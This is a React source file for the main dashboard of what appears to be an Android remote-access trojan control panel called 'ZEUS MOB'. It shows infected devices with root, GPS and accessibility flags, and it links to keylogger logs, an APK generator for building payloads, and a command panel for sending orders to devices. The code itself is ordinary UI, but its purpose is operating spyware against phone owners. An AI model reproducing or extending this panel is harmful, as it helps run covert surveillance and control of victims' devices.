import { Layout, TopBar, Panel, PanelHeader } from "@/components/layout";
import { StatsBar } from "@/components/stats-bar";
import { EventConsole } from "@/components/event-console";
import { CommandPanel } from "@/components/command-panel";
import { useListDevices, getListDevicesQueryKey } from "@workspace/api-client-react";
import { useSocket } from "@/hooks/use-socket";
import { useEffect } from "react";
import { useQueryClient } from "@tanstack/react-query";
import { useAudioAlerts } from "@/hooks/use-audio-alerts";
import { Link } from "wouter";

const G = "#00ff88";

export default function Dashboard() {
  const { data: devices } = useListDevices();
  const socket = useSocket();
  const queryClient = useQueryClient();

  useAudioAlerts();

  useEffect(() => {
    const handle = (data: { deviceId: number; status: string }) => {
      queryClient.setQueryData(getListDevicesQueryKey(), (old: any) => {
        if (!old) return old;
        return old.map((d: any) => d.id === data.deviceId ? { ...d, status: data.status } : d);
      });
    };
    socket.on("device:status", handle);
    return () => { socket.off("device:status", handle); };
  }, [socket, queryClient]);

  const online = devices?.filter((d: any) => d.status === "online" || d.status === "idle").length ?? 0;
  const total = devices?.length ?? 0;

  return (
    <Layout>
      <TopBar title="ZEUS MOB // MISSION CONTROL">
        <span style={{ color: G }}>{online} ONLINE</span>
        <span style={{ color: "#334" }}>|</span>
        <span style={{ color: "#445" }}>{total} TOTAL</span>
      </TopBar>

      <StatsBar />

      {/* Quick access cards */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 8, marginBottom: 12 }}>
        {[
          { href: "/clientes", icon: "📱", label: "CLIENTES", desc: `${total} dispositivos`, color: G },
          { href: "/administrador", icon: "🔐", label: "ADMINISTRADOR", desc: "Logs & Keylogger", color: "#44aaff" },
          { href: "/members", icon: "👥", label: "SOCIOS", desc: "Gestão de membros", color: "#ffaa00" },
          { href: "/apk-generator", icon: "⚙", label: "GERADOR APK", desc: "Build & Deploy", color: "#aa88ff" },
        ].map((card) => (
          <Link key={card.href} href={card.href}>
            <div
              style={{
                border: `1px solid #1a3a20`,
                background: "#020a04",
                padding: "14px 12px",
                cursor: "pointer",
                transition: "all 0.15s",
                textAlign: "center",
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.borderColor = card.color;
                e.currentTarget.style.boxShadow = `0 0 12px ${card.color}22`;
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.borderColor = "#1a3a20";
                e.currentTarget.style.boxShadow = "none";
              }}
            >
              <div style={{ fontSize: 24, marginBottom: 6 }}>{card.icon}</div>
              <div style={{ fontSize: 10, fontWeight: "bold", color: card.color, letterSpacing: "0.1em", marginBottom: 3 }}>
                {card.label}
              </div>
              <div style={{ fontSize: 8, color: "#445" }}>{card.desc}</div>
            </div>
          </Link>
        ))}
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 260px", gap: 8 }}>
        {/* Live devices preview */}
        <Panel>
          <PanelHeader>
            <span>&gt; DISPOSITIVOS ATIVOS</span>
            <Link href="/clientes">
              <span style={{ color: "#445", cursor: "pointer", fontSize: 8, letterSpacing: "0.08em" }}
                onMouseEnter={(e) => { e.currentTarget.style.color = G; }}
                onMouseLeave={(e) => { e.currentTarget.style.color = "#445"; }}
              >
                VER TODOS →
              </span>
            </Link>
          </PanelHeader>
          <div style={{ maxHeight: 380, overflowY: "auto" }}>
            {!devices || devices.length === 0 ? (
              <div style={{ padding: 24, textAlign: "center", color: "#334", fontSize: 10 }}>
                &gt; AGUARDANDO CONEXÕES DE DISPOSITIVOS...
              </div>
            ) : (
              devices.slice(0, 10).map((d: any) => {
                const isOnline = d.status === "online" || d.status === "idle";
                return (
                  <Link key={d.id} href="/clientes">
                    <div
                      style={{
                        display: "grid",
                        gridTemplateColumns: "10px 1fr auto auto",
                        gap: 10,
                        padding: "6px 12px",
                        borderBottom: "1px solid #0a160c",
                        alignItems: "center",
                        cursor: "pointer",
                        fontSize: 10,
                      }}
                      onMouseEnter={(e) => { e.currentTarget.style.background = "#051208"; }}
                      onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
                    >
                      <span
                        style={{
                          width: 8,
                          height: 8,
                          borderRadius: "50%",
                          background: isOnline ? G : "#ff3333",
                          boxShadow: isOnline ? `0 0 6px ${G}` : "none",
                          display: "inline-block",
                        }}
                      />
                      <div>
                        <div style={{ color: G, fontWeight: "bold", fontSize: 10 }}>{d.name}</div>
                        <div style={{ color: "#445", fontSize: 8 }}>{d.model || "Android"}</div>
                      </div>
                      <div style={{ display: "flex", gap: 4 }}>
                        {d.hasRoot && <span style={{ fontSize: 7, padding: "1px 3px", border: "1px solid #ff8800", color: "#ff8800" }}>ROOT</span>}
                        {d.gpsActive && <span style={{ fontSize: 7, padding: "1px 3px", border: `1px solid ${G}`, color: G }}>GPS</span>}
                        {d.accessibilityOn && <span style={{ fontSize: 7, padding: "1px 3px", border: "1px solid #44aaff", color: "#44aaff" }}>ACC</span>}
                      </div>
                      <span style={{ fontSize: 8, color: isOnline ? G : "#445", letterSpacing: "0.06em" }}>
                        {d.status?.toUpperCase()}
                      </span>
                    </div>
                  </Link>
                );
              })
            )}
          </div>
        </Panel>

        {/* Event console */}
        <EventConsole height={420} />
      </div>

      {/* Command panel */}
      <div style={{ marginTop: 8 }}>
        <CommandPanel devices={devices} height={200} />
      </div>
    </Layout>
  );
}
